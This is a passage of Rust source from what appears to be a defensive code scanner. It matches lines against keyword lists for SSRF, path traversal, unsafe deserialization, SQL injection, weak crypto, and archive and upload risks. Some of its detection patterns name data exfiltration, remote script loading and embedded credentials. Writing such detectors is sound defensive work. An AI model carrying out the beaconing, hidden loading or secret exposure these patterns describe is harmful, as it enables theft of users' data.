                "Avoid direct metadata-service fetches from application request paths, and ensure any internal fetch capability is tightly allowlisted.",
                format!("sast-ssrf-metadata:{}:{}", file.display(), line_number),
            )
            .with_line(line_number),
        );
    }

    if !line_uses_untrusted_input(&lower) {
        return None;
    }

    Some(
        Finding::new(
            "sast.ssrf.untrusted-url",
            scanner,
            Severity::High,
            Confidence::Medium,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Untrusted input appears to drive an outbound URL fetch",
            "The candidate file appears to pass request or CLI-controlled data into an outbound HTTP client call, which can create SSRF risk if destinations are not allowlisted.",
            "Do not fetch arbitrary caller-supplied URLs. Resolve through a strict allowlist, parse and validate hosts explicitly, and block internal address space.",
            format!("sast-ssrf-untrusted-url:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_path_traversal_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    if !line_uses_untrusted_input(&lower) {
        return None;
    }

    let detail = if is_javascript_like(file)
        && [
            "fs.readfile(",
            "fs.readfilesync(",
            "fs.writefile(",
            "fs.writefilesync(",
            "res.sendfile(",
            "res.download(",
            "createreadstream(",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to pass request-controlled path data into a JavaScript filesystem or file-delivery sink.",
        )
    } else if is_python_like(file)
        && ["open(", "send_file(", "send_from_directory("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to pass request or argument-controlled path data into a Python filesystem or file-delivery sink.",
        )
    } else if is_php_like(file)
        && ["file_get_contents(", "fopen(", "include(", "require("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to pass request-controlled path data into a PHP filesystem or include sink.",
        )
    } else if is_java_like(file)
        && [
            "files.readstring(",
            "files.readallbytes(",
            "new fileinputstream(",
            "new filereader(",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to pass request or argument-controlled path data into a JVM filesystem sink.",
        )
    } else {
        None
    }?;

    Some(
        Finding::new(
            "sast.path-traversal.untrusted-path",
            scanner,
            Severity::High,
            Confidence::Medium,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Untrusted input reaches a filesystem path sink",
            detail,
            "Do not use request or CLI-controlled path fragments directly. Normalize paths, enforce an allowlisted base directory, and reject traversal sequences.",
            format!("sast-path-traversal:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_unsafe_deserialization_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();

    let detail = if is_python_like(file)
        && [
            "pickle.load(",
            "pickle.loads(",
            "dill.load(",
            "dill.loads(",
            "marshal.load(",
            "marshal.loads(",
            "jsonpickle.decode(",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file uses a Python deserialization primitive that can execute attacker-controlled behavior when fed untrusted data.",
        )
    } else if is_python_like(file)
        && lower.contains("yaml.load(")
        && !lower.contains("yaml.safe_load(")
    {
        Some(
            "The candidate file uses `yaml.load(` instead of a safe loader, which is a common unsafe-deserialization path in Python.",
        )
    } else if is_java_like(file)
        && ((lower.contains("objectinputstream") && lower.contains("readobject("))
            || lower.contains("xmldecoder.readobject("))
    {
        Some(
            "The candidate file uses a JVM object-deserialization primitive that is dangerous with untrusted input.",
        )
    } else if is_php_like(file) && lower.contains("unserialize(") {
        Some(
            "The candidate file uses PHP `unserialize(`, which is dangerous when fed untrusted data.",
        )
    } else if is_ruby_like(file)
        && ["marshal.load(", "yaml.load("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file uses a Ruby deserialization primitive that is dangerous with untrusted data.",
        )
    } else if is_csharp_like(file)
        && lower.contains("binaryformatter")
        && lower.contains("deserialize(")
    {
        Some(
            "The candidate file uses `.NET BinaryFormatter.Deserialize`, which is a known unsafe-deserialization primitive.",
        )
    } else {
        None
    }?;

    Some(
        Finding::new(
            "sast.unsafe-deserialization",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Unsafe deserialization primitive detected",
            detail,
            "Replace the primitive with a safe parser or a format that does not instantiate attacker-controlled objects, and keep untrusted data away from general object deserializers.",
            format!("sast-unsafe-deserialization:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_sql_injection_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    if !line_uses_untrusted_input(&lower) || !line_looks_like_sql_text(&lower) {
        return None;
    }

    let detail = if is_javascript_like(file)
        && [".query(", ".execute(", "sequelize.query("]
            .iter()
            .any(|needle| lower.contains(needle))
        && (line.contains("${") || line.contains('+'))
    {
        Some(
            "The candidate file appears to interpolate request or argument-controlled data into a JavaScript SQL query string before execution.",
        )
    } else if is_python_like(file)
        && [".execute(", "cursor.execute(", "executemany("]
            .iter()
            .any(|needle| lower.contains(needle))
        && (line.contains("f\"")
            || line.contains("f'")
            || line.contains('+')
            || line.contains(".format(")
            || line.contains('%'))
    {
        Some(
            "The candidate file appears to interpolate request or argument-controlled data into a Python SQL query string before execution.",
        )
    } else if is_php_like(file)
        && ["->query(", "mysqli_query(", "pdo->query("]
            .iter()
            .any(|needle| lower.contains(needle))
        && line.contains('.')
    {
        Some(
            "The candidate file appears to concatenate request-controlled data into a PHP SQL query string before execution.",
        )
    } else if is_ruby_like(file)
        && [".execute(", ".find_by_sql(", ".where("]
            .iter()
            .any(|needle| lower.contains(needle))
        && (line.contains("#{") || line.contains('+'))
    {
        Some(
            "The candidate file appears to interpolate request or argument-controlled data into a Ruby SQL query string before execution.",
        )
    } else {
        None
    }?;

    Some(
        Finding::new(
            "sast.sql-injection.untrusted-query",
            scanner,
            Severity::High,
            Confidence::Medium,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Untrusted input appears to reach a SQL query string",
            detail,
            "Use parameterized queries or prepared statements instead of concatenating or interpolating caller-controlled data into SQL text.",
            format!("sast-sql-injection:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_insecure_randomness_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    if !line_mentions_secret_generation_context(&lower) {
        return None;
    }

    let detail = if is_javascript_like(file) && lower.contains("math.random(") {
        Some(
            "The candidate file appears to use JavaScript `Math.random()` while generating a token, secret, session value, or similar credential-like value.",
        )
    } else if is_python_like(file)
        && [
            "random.random(",
            "random.randint(",
            "random.randrange(",
            "random.choice(",
            "random.choices(",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to use Python's `random` module while generating a token, secret, session value, or similar credential-like value.",
        )
    } else if is_java_like(file)
        && [
            "math.random(",
            "new random(",
            "threadlocalrandom.current(",
            "randomstringutils.random",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to use a non-cryptographic JVM random source while generating a token, secret, session value, or similar credential-like value.",
        )
    } else if is_php_like(file)
        && ["rand(", "mt_rand(", "lcg_value("]
            .iter()
            .any(|needle| lower.contains(needle))
    {
        Some(
            "The candidate file appears to use a non-cryptographic PHP random source while generating a token, secret, session value, or similar credential-like value.",
        )
    } else if is_ruby_like(file) && lower.contains("rand(") {
        Some(
            "The candidate file appears to use Ruby `rand(` while generating a token, secret, session value, or similar credential-like value.",
        )
    } else {
        None
    }?;

    Some(
        Finding::new(
            "sast.insecure-randomness.secret-generation",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Non-cryptographic randomness appears to generate a secret or token",
            detail,
            "Use a cryptographically secure randomness source for tokens, session identifiers, password reset values, and other credential-like material.",
            format!("sast-insecure-randomness:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_unsafe_crypto_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();

    let (detail, severity) = if is_javascript_like(file)
        && lower.contains("createhash(")
        && (lower.contains("md5") || lower.contains("sha1"))
        && line_mentions_secret_material(&lower)
    {
        (
            "The candidate file appears to hash password-, token-, or secret-like material with a weak digest such as MD5 or SHA-1.",
            Severity::Medium,
        )
    } else if is_python_like(file)
        && (lower.contains("hashlib.md5(") || lower.contains("hashlib.sha1("))
        && line_mentions_secret_material(&lower)
    {
        (
            "The candidate file appears to hash password-, token-, or secret-like material with a weak Python digest such as MD5 or SHA-1.",
            Severity::Medium,
        )
    } else if is_java_like(file)
        && lower.contains("messagedigest.getinstance(")
        && (lower.contains("\"md5\"") || lower.contains("\"sha-1\""))
        && line_mentions_secret_material(&lower)
    {
        (
            "The candidate file appears to hash password-, token-, or secret-like material with a weak JVM digest such as MD5 or SHA-1.",
            Severity::Medium,
        )
    } else if is_php_like(file)
        && ["md5(", "sha1("]
            .iter()
            .any(|needle| lower.contains(needle))
        && line_mentions_secret_material(&lower)
    {
        (
            "The candidate file appears to hash password-, token-, or secret-like material with a weak PHP digest such as MD5 or SHA-1.",
            Severity::Medium,
        )
    } else if is_ruby_like(file)
        && ["digest::md5", "digest::sha1"]
            .iter()
            .any(|needle| lower.contains(needle))
        && line_mentions_secret_material(&lower)
    {
        (
            "The candidate file appears to hash password-, token-, or secret-like material with a weak Ruby digest such as MD5 or SHA-1.",
            Severity::Medium,
        )
    } else if is_javascript_like(file)
        && ["des-", "rc4", "aes-128-ecb", "aes-192-ecb", "aes-256-ecb"]
            .iter()
            .any(|needle| lower.contains(needle))
        && (lower.contains("createcipher(") || lower.contains("createcipheriv("))
    {
        (
            "The candidate file appears to use a legacy or ECB-mode cipher in a JavaScript encryption path.",
            Severity::High,
        )
    } else if is_python_like(file)
        && (lower.contains("des.new(")
            || lower.contains("des3.new(")
            || lower.contains("arc4.new(")
            || (lower.contains("aes.new(") && lower.contains("mode_ecb")))
    {
        (
            "The candidate file appears to use a legacy cipher or ECB mode in a Python encryption path.",
            Severity::High,
        )
    } else if is_java_like(file)
        && lower.contains("cipher.getinstance(")
        && (lower.contains("\"des")
            || lower.contains("\"desede")
            || lower.contains("\"rc4")
            || lower.contains("aes/ecb"))
    {
        (
            "The candidate file appears to use a legacy cipher or ECB mode in a JVM encryption path.",
            Severity::High,
        )
    } else if is_php_like(file)
        && ((lower.contains("openssl_encrypt(") || lower.contains("openssl_decrypt("))
            && (lower.contains("des-") || lower.contains("rc4") || lower.contains("ecb")))
            || lower.contains("mcrypt_")
    {
        (
            "The candidate file appears to use a legacy cipher or ECB mode in a PHP encryption path.",
            Severity::High,
        )
    } else if is_ruby_like(file)
        && lower.contains("openssl::cipher.new(")
        && (lower.contains("des") || lower.contains("rc4") || lower.contains("ecb"))
    {
        (
            "The candidate file appears to use a legacy cipher or ECB mode in a Ruby encryption path.",
            Severity::High,
        )
    } else {
        return None;
    };

    Some(
        Finding::new(
            "sast.unsafe-crypto.weak-primitive",
            scanner,
            severity,
            Confidence::High,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            "Unsafe cryptographic primitive or mode detected",
            detail,
            "Use modern, cryptographically appropriate primitives such as SHA-256 or stronger for hashing and authenticated encryption modes such as AES-GCM or ChaCha20-Poly1305 for encryption.",
            format!("sast-unsafe-crypto:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_file_upload_or_archive_extraction_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();

    let (id, title, detail, remediation, severity) = if line_uses_uploaded_file_context(&lower) {
        if is_javascript_like(file)
            && [
                ".mv(",
                "fs.writefile(",
                "fs.writefilesync(",
                "fs.createwritestream(",
            ]
            .iter()
            .any(|needle| lower.contains(needle))
        {
            (
                "sast.file-upload.untrusted-write",
                "Uploaded file appears to be written directly from request context",
                "The candidate file appears to persist an uploaded file or uploaded filename directly from a JavaScript request context, which often needs strict path handling, filename normalization, content validation, and storage controls.",
                "Validate uploaded content, generate server-side filenames, constrain the destination path, and avoid trusting client-supplied names or paths.",
                Severity::Medium,
            )
        } else if is_python_like(file) && lower.contains(".save(") {
            (
                "sast.file-upload.untrusted-write",
                "Uploaded file appears to be written directly from request context",
                "The candidate file appears to save an uploaded file directly from a Python request context, which often needs strict path handling, filename normalization, content validation, and storage controls.",
                "Validate uploaded content, generate server-side filenames, constrain the destination path, and avoid trusting client-supplied names or paths.",
                Severity::Medium,
            )
        } else if is_java_like(file) && lower.contains(".transferto(") {
            (
                "sast.file-upload.untrusted-write",
                "Uploaded file appears to be written directly from request context",
                "The candidate file appears to transfer an uploaded file directly from a JVM request context, which often needs strict path handling, filename normalization, content validation, and storage controls.",
                "Validate uploaded content, generate server-side filenames, constrain the destination path, and avoid trusting client-supplied names or paths.",
                Severity::Medium,
            )
        } else if is_php_like(file) && lower.contains("move_uploaded_file(") {
            (
                "sast.file-upload.untrusted-write",
                "Uploaded file appears to be written directly from request context",
                "The candidate file appears to move an uploaded file directly from a PHP request context, which often needs strict path handling, filename normalization, content validation, and storage controls.",
                "Validate uploaded content, generate server-side filenames, constrain the destination path, and avoid trusting client-supplied names or paths.",
                Severity::Medium,
            )
        } else if is_ruby_like(file)
            && [".write(", ".binwrite("]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.file-upload.untrusted-write",
                "Uploaded file appears to be written directly from request context",
                "The candidate file appears to write uploaded content directly from a Ruby request context, which often needs strict path handling, filename normalization, content validation, and storage controls.",
                "Validate uploaded content, generate server-side filenames, constrain the destination path, and avoid trusting client-supplied names or paths.",
                Severity::Medium,
            )
        } else if is_python_like(file)
            && ["extractall(", "extract(", "unpack_archive("]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.archive-extraction.untrusted-input",
                "Uploaded archive appears to be extracted directly from request context",
                "The candidate file appears to extract an uploaded archive directly from a Python request context, which can expose zip-slip, path traversal, or unsafe content handling issues without strict archive validation.",
                "Inspect archive entries before extraction, reject traversal paths and unsafe symlinks, constrain the extraction root, and avoid extracting attacker-controlled archives blindly.",
                Severity::High,
            )
        } else if is_javascript_like(file)
            && ["extractallto(", ".extract(", "tar.x(", "tar.extract("]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.archive-extraction.untrusted-input",
                "Uploaded archive appears to be extracted directly from request context",
                "The candidate file appears to extract an uploaded archive directly from a JavaScript request context, which can expose zip-slip, path traversal, or unsafe content handling issues without strict archive validation.",
                "Inspect archive entries before extraction, reject traversal paths and unsafe symlinks, constrain the extraction root, and avoid extracting attacker-controlled archives blindly.",
                Severity::High,
            )
        } else if is_java_like(file)
            && ["zipinputstream", "zipfile", "archiveinputstream"]
                .iter()
                .any(|needle| lower.contains(needle))
            && ["extract", "copy(", "putnextentry("]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.archive-extraction.untrusted-input",
                "Uploaded archive appears to be extracted directly from request context",
                "The candidate file appears to extract an uploaded archive directly from a JVM request context, which can expose zip-slip, path traversal, or unsafe content handling issues without strict archive validation.",
                "Inspect archive entries before extraction, reject traversal paths and unsafe symlinks, constrain the extraction root, and avoid extracting attacker-controlled archives blindly.",
                Severity::High,
            )
        } else if is_php_like(file)
            && ["ziparchive", "phardata"]
                .iter()
                .any(|needle| lower.contains(needle))
            && ["extractto(", "extract("]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.archive-extraction.untrusted-input",
                "Uploaded archive appears to be extracted directly from request context",
                "The candidate file appears to extract an uploaded archive directly from a PHP request context, which can expose zip-slip, path traversal, or unsafe content handling issues without strict archive validation.",
                "Inspect archive entries before extraction, reject traversal paths and unsafe symlinks, constrain the extraction root, and avoid extracting attacker-controlled archives blindly.",
                Severity::High,
            )
        } else if is_ruby_like(file)
            && ["zip::file", "archive::tar::minitar"]
                .iter()
                .any(|needle| lower.contains(needle))
            && ["extract", "unpack"]
                .iter()
                .any(|needle| lower.contains(needle))
        {
            (
                "sast.archive-extraction.untrusted-input",
                "Uploaded archive appears to be extracted directly from request context",
                "The candidate file appears to extract an uploaded archive directly from a Ruby request context, which can expose zip-slip, path traversal, or unsafe content handling issues without strict archive validation.",
                "Inspect archive entries before extraction, reject traversal paths and unsafe symlinks, constrain the extraction root, and avoid extracting attacker-controlled archives blindly.",
                Severity::High,
            )
        } else {
            return None;
        }
    } else {
        return None;
    };

    Some(
        Finding::new(
            id,
            scanner,
            severity,
            Confidence::Medium,
            FindingCategory::Vulnerability,
            Some(file.to_path_buf()),
            title,
            detail,
            remediation,
            format!("sast-upload-archive:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_authz_bypass_pattern(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lower = line.to_ascii_lowercase();
    let path_lower = file.to_string_lossy().to_ascii_lowercase();

    if line_uses_untrusted_input(&lower)
        && line_mentions_privilege_field(&lower)
        && line_looks_like_privilege_assignment(&lower)
    {
        let detail = if is_javascript_like(file) {
            Some(
                "The candidate file appears to let JavaScript request input set role, admin, permission, tenant, or ownership-related state directly.",
            )
        } else if is_python_like(file) {
            Some(
                "The candidate file appears to let Python request input set role, admin, permission, tenant, or ownership-related state directly.",
            )
        } else if is_java_like(file) {
            Some(
                "The candidate file appears to let JVM request input set role, admin, permission, tenant, or ownership-related state directly.",
            )
        } else if is_php_like(file) {
            Some(
                "The candidate file appears to let PHP request input set role, admin, permission, tenant, or ownership-related state directly.",
            )
        } else if is_ruby_like(file) {
            Some(
                "The candidate file appears to let Ruby request input set role, admin, permission, tenant, or ownership-related state directly.",
            )
        } else {
            None
        }?;

        return Some(
            Finding::new(
                "sast.authz-bypass.untrusted-privilege-assignment",
                scanner,
                Severity::High,
                Confidence::Medium,
                FindingCategory::Vulnerability,
                Some(file.to_path_buf()),
                "Request-controlled input appears to set privilege or ownership state",
                detail,
                "Do not trust caller-supplied role, admin, permission, tenant, or ownership fields directly. Derive authorization state from trusted server-side identity and enforce explicit privilege checks.",
                format!("sast-authz-privilege-assignment:{}:{}", file.display(), line_number),
            )
            .with_line(line_number),
        );
    }

    if line_mentions_access_control_bypass_marker(&lower)
        && file_or_line_mentions_privileged_surface(&path_lower, &lower)
    {
        let detail = if is_javascript_like(file) {
            Some(
                "The candidate file appears to mark a privileged JavaScript route or surface as bypassing normal auth or authorization checks.",
            )
        } else if is_python_like(file) {
            Some(
                "The candidate file appears to mark a privileged Python route or surface as bypassing normal auth or authorization checks.",
            )
        } else if is_java_like(file) {
            Some(
                "The candidate file appears to mark a privileged JVM route or surface as bypassing normal auth or authorization checks.",
            )
        } else if is_php_like(file) {
            Some(
                "The candidate file appears to mark a privileged PHP route or surface as bypassing normal auth or authorization checks.",
            )
        } else if is_ruby_like(file) {
            Some(
                "The candidate file appears to mark a privileged Ruby route or surface as bypassing normal auth or authorization checks.",
            )
        } else if is_csharp_like(file) {
            Some(
                "The candidate file appears to mark a privileged .NET route or surface as bypassing normal auth or authorization checks.",
            )
        } else {
            None
        }?;

        return Some(
            Finding::new(
                "sast.authz-bypass.privileged-surface-open-access",
                scanner,
                Severity::High,
                Confidence::Medium,
                FindingCategory::Vulnerability,
                Some(file.to_path_buf()),
                "Privileged surface appears to bypass normal access control",
                detail,
                "Keep privileged or ownership-sensitive routes behind explicit authentication and authorization middleware, decorators, or policy checks. Do not mark them anonymous or bypassed by default.",
                format!("sast-authz-open-access:{}:{}", file.display(), line_number),
            )
            .with_line(line_number),
        );
    }

    None
}

fn scan_archive_artifact(scanner: &'static str, file: &Path, prefix: &[u8]) -> Option<Finding> {
    if !looks_like_archive_artifact(file, prefix) {
        return None;
    }

    Some(Finding::new(
        "artifact.packaged-archive",
        scanner,
        Severity::Medium,
        Confidence::High,
        FindingCategory::Configuration,
        Some(file.to_path_buf()),
        "Packaged archive artifact included in outbound change set",
        "The candidate change set includes a packaged archive such as a zip, tarball, jar, or compressed bundle. Opaque packaged artifacts reduce reviewability and can hide bundled executables, secrets, or generated payloads.",
        "Prefer checked-in source plus a reproducible build recipe. If the archive must be versioned, review its contents explicitly and document why the packaged artifact belongs in the repository.",
        format!("artifact-archive:{}", file.display()),
    ))
}

fn scan_zip_style_archive_contents(
    scanner: &'static str,
    file: &Path,
    bytes: &[u8],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen_ids = HashSet::new();

    for entry in zip_style_archive_entry_names(bytes) {
        if archive_entry_has_path_traversal(&entry)
            && seen_ids.insert("artifact.archive.path-traversal-entry")
        {
            findings.push(
                Finding::new(
                    "artifact.archive.path-traversal-entry",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Vulnerability,
                    Some(file.to_path_buf()),
                    "Archive artifact contains a traversal-style entry path",
                    format!(
                        "The candidate archive appears to contain an entry named `{entry}`. Traversal-style archive paths can unpack outside the intended destination and deserve review before the archive is trusted or extracted."
                    ),
                    "Reject traversal-style archive entries, keep extraction roots fixed, and avoid trusting archives that contain absolute or parent-directory paths.",
                    format!("artifact-archive-traversal:{}:{}", file.display(), entry),
                )
            );
        }

        if archive_entry_looks_executable(&entry)
            && seen_ids.insert("artifact.archive.embedded-executable")
        {
            let severity = if path_is_source_like(file) || path_is_public_distribution_like(file) {
                Severity::High
            } else {
                Severity::Medium
            };

            findings.push(
                Finding::new(
                    "artifact.archive.embedded-executable",
                    scanner,
                    severity,
                    Confidence::Medium,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Archive artifact contains an embedded executable payload",
                    format!(
                        "The candidate archive appears to contain an executable-like entry named `{entry}`. Embedded launchers or binary payloads reduce reviewability and deserve provenance review before the archive is kept in source control."
                    ),
                    "Review the embedded payload, confirm why the archive needs executable content, and prefer source plus reproducible packaging where possible.",
                    format!("artifact-archive-executable:{}:{}", file.display(), entry),
                )
            );
        }
    }

    findings
}

fn scan_compiled_binary_artifact(
    scanner: &'static str,
    file: &Path,
    prefix: &[u8],
) -> Option<Finding> {
    let Some(binary_kind) = compiled_binary_kind(file, prefix) else {
        return None;
    };

    let severity = if path_is_source_like(file) {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(Finding::new(
        "artifact.compiled-binary",
        scanner,
        severity,
        Confidence::High,
        FindingCategory::Configuration,
        Some(file.to_path_buf()),
        "Compiled binary artifact included in outbound change set",
        format!(
            "The candidate file appears to be a compiled {binary_kind} rather than reviewable source text. Binary payloads reduce reviewability and can hide bundled logic or credentials."
        ),
        "Prefer checked-in source and reproducible builds. If the binary must be committed, review its provenance and document why the repository needs the compiled artifact.",
        format!("artifact-binary:{}:{}", binary_kind, file.display()),
    ))
}

fn scan_minified_javascript_bundle(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Option<Finding> {
    if !is_javascript_like(file) || !looks_like_minified_javascript(contents) {
        return None;
    }

    let lower = contents.to_ascii_lowercase();
    let has_dynamic_loader = lower.contains("document.createelement(\"script\")")
        || lower.contains("document.createelement('script')")
        || lower.contains("appendchild(") && lower.contains(".src=")
        || lower.contains("importscripts(")
        || lower.contains("new worker(")
        || lower.contains("eval(")
        || lower.contains("new function(");
    let has_remote_endpoint = lower.contains("https://")
        || lower.contains("http://")
        || lower.contains("wss://")
        || lower.contains("ws://");

    if !has_dynamic_loader || !has_remote_endpoint {
        return None;
    }

    Some(Finding::new(
        "artifact.minified-bundle.remote-loader",
        scanner,
        Severity::Medium,
        Confidence::Medium,
        FindingCategory::Vulnerability,
        Some(file.to_path_buf()),
        "Minified JavaScript bundle contains dynamic remote loader behavior",
        "The candidate minified JavaScript bundle appears to combine dynamic execution or script-loader behavior with embedded remote endpoints. That makes the generated payload harder to review and can hide beaconing or staged code loading.",
        "Review the unminified source that produced the bundle, verify the remote endpoint is expected, and avoid dynamic loader patterns in shipped generated assets where possible.",
        format!("artifact-minified-bundle-loader:{}", file.display()),
    ))
}

fn scan_minified_javascript_beaconing(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Option<Finding> {
    if !is_javascript_like(file) || !looks_like_minified_javascript(contents) {
        return None;
    }

    let lower = contents.to_ascii_lowercase();
    let has_remote_endpoint = lower.contains("https://")
        || lower.contains("http://")
        || lower.contains("wss://")
        || lower.contains("ws://");
    let has_beaconing_behavior = lower.contains("navigator.sendbeacon(")
        || (lower.contains("fetch(") && lower.contains("keepalive:true"))
        || (lower.contains("new image(") && lower.contains(".src="))
        || (lower.contains("image().src=") || lower.contains("new image().src="));

    if !has_remote_endpoint || !has_beaconing_behavior {
        return None;
    }

    let severity = if path_is_public_distribution_like(file) {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(Finding::new(
        "artifact.minified-bundle.beaconing",
        scanner,
        severity,
        Confidence::Medium,
        FindingCategory::Vulnerability,
        Some(file.to_path_buf()),
        "Minified JavaScript bundle contains remote beaconing behavior",
        "The candidate minified JavaScript bundle appears to beacon or exfiltration-track to a remote endpoint through `sendBeacon`, keepalive fetches, or image-pixel style requests. That behavior is hard to review once bundled and deserves provenance review before shipping.",
        "Review the unminified source that produced the bundle, verify the remote telemetry or beacon endpoint is intentional, and remove hidden beaconing behavior from generated assets where possible.",
        format!("artifact-minified-bundle-beaconing:{}", file.display()),
    ))
}

fn scan_source_map_artifact(scanner: &'static str, file: &Path) -> Option<Finding> {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    if !lower.ends_with(".map") {
        return None;
    }

    let severity = if path_is_source_like(file) {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(Finding::new(
        "artifact.source-map",
        scanner,
        severity,
        Confidence::High,
        FindingCategory::Configuration,
        Some(file.to_path_buf()),
        "Source map artifact included in outbound change set",
        "The candidate change set includes a source map artifact. Source maps can expose original client or application source structure, comments, endpoint names, and other implementation details that are not meant to ship broadly.",
        "Avoid committing deployable source maps unless the repository intentionally ships them and the exposure is reviewed. Prefer keeping them out of public artifact paths or restricting their distribution.",
        format!("artifact-source-map:{}", file.display()),
    ))
}

fn scan_generated_asset_embedded_secret(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Option<Finding> {
    if !path_is_generated_asset_like(file) {
        return None;
    }

    for (index, line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let wrapped = scan_private_key_headers(scanner, file, line_number, line)
            .or_else(|| scan_private_key_assignment(scanner, file, line_number, line))
            .or_else(|| scan_inline_authorization_credential(scanner, file, line_number, line))
            .or_else(|| scan_inline_secret_header(scanner, file, line_number, line))
            .or_else(|| scan_connection_string_secret(scanner, file, line_number, line))
            .or_else(|| scan_service_webhook_url(scanner, file, line_number, line))
            .or_else(|| scan_secret_assignment(scanner, file, line_number, line));

        let Some(secret_finding) = wrapped else {
            continue;
        };

        let severity = if path_is_public_distribution_like(file)
            || matches!(secret_finding.severity, Severity::High | Severity::Critical)
        {
            Severity::High
        } else {
            Severity::Medium
        };

        return Some(
            Finding::new(
                "artifact.generated-asset.embedded-secret",
                scanner,
                severity,
                secret_finding.confidence,
                FindingCategory::Secret,
                Some(file.to_path_buf()),
                "Generated asset appears to embed credential-like material",
                format!(
                    "The candidate generated or distribution asset appears to embed credential-like content ({}) directly in a bundled file. Generated client assets can leak deployable secrets broadly and are harder to review than source files.",
                    secret_finding.title
                ),
                "Remove the secret from the generated artifact, rotate it if it is real, and ensure distribution bundles only contain safe public configuration.",
                format!(
                    "artifact-generated-secret:{}:{}",
                    file.display(),
                    line_number
                ),
            )
            .with_line(line_number),
        );
    }

    None
}

fn scan_new_executable_text_artifact(
    scanner: &'static str,
    context: &ExecutionContext,
    file: &Path,
    metadata: &fs::Metadata,
    prefix: &[u8],
    contents: &str,
) -> AppResult<Option<Finding>> {
    if !file_is_executable(metadata)
        || !looks_like_executable_text_artifact(file, prefix, contents)
        || path_is_normal_script_container(file)
    {
        return Ok(None);
    }

    if baseline_file_contents(context, file)?.is_some() {
        return Ok(None);
    }

    let severity = if path_is_source_like(file) || path_is_public_distribution_like(file) {
        Severity::High
    } else {
        Severity::Medium
    };

    Ok(Some(Finding::new(
        "artifact.executable-text.new-file",
        scanner,
        severity,
        Confidence::Medium,
        FindingCategory::Configuration,
        Some(file.to_path_buf()),
        "New executable text artifact added outside normal script locations",
        "The candidate change set adds a newly introduced executable text launcher outside the repository's usual script or tooling paths. New executable launchers deserve provenance review because they can become hidden entrypoints for staged code, remote fetches, or local workflow tampering.",
        "Review why the file needs to be executable, keep executable launchers in explicit script or tooling locations when intentional, and verify the new entrypoint's provenance before push.",
        format!("artifact-new-executable-text:{}", file.display()),
    )))
}

fn scan_kubernetes_secret_manifest(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Option<Finding> {
    let lower = contents.to_ascii_lowercase();
    let is_kubernetes_secret = lower.contains("kind: secret")
        || (lower.contains("\"kind\"") && lower.contains("\"secret\""));
    if !is_kubernetes_secret {
        return None;
    }

    let has_inline_secret_data = lower.contains("stringdata:")
        || lower.contains("data:")
        || lower.contains("\"stringdata\"")
        || lower.contains("\"data\"");
    if !has_inline_secret_data {
        return None;
    }

    Some(Finding::new(
        "config.kubernetes.secret-manifest",
        scanner,
        Severity::High,
        Confidence::High,
        FindingCategory::Secret,
        Some(file.to_path_buf()),
        "Kubernetes Secret manifest with inline data detected",
        "The candidate configuration appears to define a Kubernetes Secret resource with inline `data` or `stringData`, which often means secret material is being pushed directly into version control.",
        "Move the secret payload to a secure secret-management workflow or encrypted manifest path instead of committing inline Kubernetes Secret data.",
